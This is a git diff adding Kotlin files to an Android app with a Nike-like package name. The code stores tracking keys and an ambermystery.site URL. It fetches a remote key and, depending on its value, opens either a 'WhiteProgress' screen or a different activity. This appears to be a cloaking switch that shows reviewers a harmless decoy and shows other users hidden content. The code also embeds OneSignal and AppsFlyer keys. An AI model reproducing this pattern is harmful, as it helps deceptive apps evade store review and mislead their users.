7e44ae698a2d9f93367d40f195b6061f7b2f808d
zotovinfinitum <zotov@infinitum.media>
2022-06-06 14:20:07 +0300

    ...

---
+++ app/src/main/java/com/nike/nt/handshake/Constants.kt
@@ -0,0 +1,23 @@
+package com.nike.nt.handshake
+
+object Constants {
+
+    const val MAIN_ID = "mainId"
+    const val ONESIGNAL_APP_ID = "0efffd9e-d18a-42dd-997d-07da4af2547d"
+
+    const val AF_DEV_KEY = "TNN5PChgvbJtvFwkh6BqQn"
+
+    var DL1: String? = "dl1"
+    var DL2: String? = "dl2"
+    var DL3: String? = "dl3"
+
+    var C1: String? = "c11"
+    var C2: String? = "c22"
+    var C3: String? = "c33"
+
+    var lru = "https://ambermystery.site/gh67S?"
+
+    var asyncResult: String? = ""
+    var odone = "sub_id_1="
+
+}
---
+++ app/src/main/java/com/nike/nt/handshake/HandMeInvite.kt
@@ -0,0 +1,45 @@
+package com.nike.nt.handshake
+
+import android.content.Context
+import android.content.Intent
+import androidx.appcompat.app.AppCompatActivity
+import android.os.Bundle
+import android.util.Log
+import android.widget.TextView
+import com.nike.nt.R
+import com.nike.nt.WhiteProgress
+import com.orhanobut.hawk.Hawk
+import kotlinx.coroutines.*
+
+class HandMeInvite : AppCompatActivity() {
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_hand_me_invite)
+        val txtEr: TextView = findViewById(R.id.txtMainMain)
+
+        runBlocking {
+
+            val job: Job = GlobalScope.launch(Dispatchers.IO) {
+                getAsync(applicationContext)
+            }
+            job.join()
+            val jsoup: String? = Hawk.get(Constants.asyncResult, "")
+            Log.d("cora", "cora $jsoup")
+
+            txtEr.text = jsoup
+
+            if (jsoup == "j7G5") {
+                Intent(applicationContext, WhiteProgress::class.java).also { startActivity(it) }
+            } else {
+                Intent(applicationContext, BBRAct::class.java).also { startActivity(it) }
+            }
+            finish()
+        }
+    }
+
+    private suspend fun getAsync(context: Context) {
+        val asyncKey = AsyncJsoup(context)
+        val asyncResult = asyncKey.getDocSecretKey()
+        Hawk.put(Constants.asyncResult, asyncResult)
+    }
+}
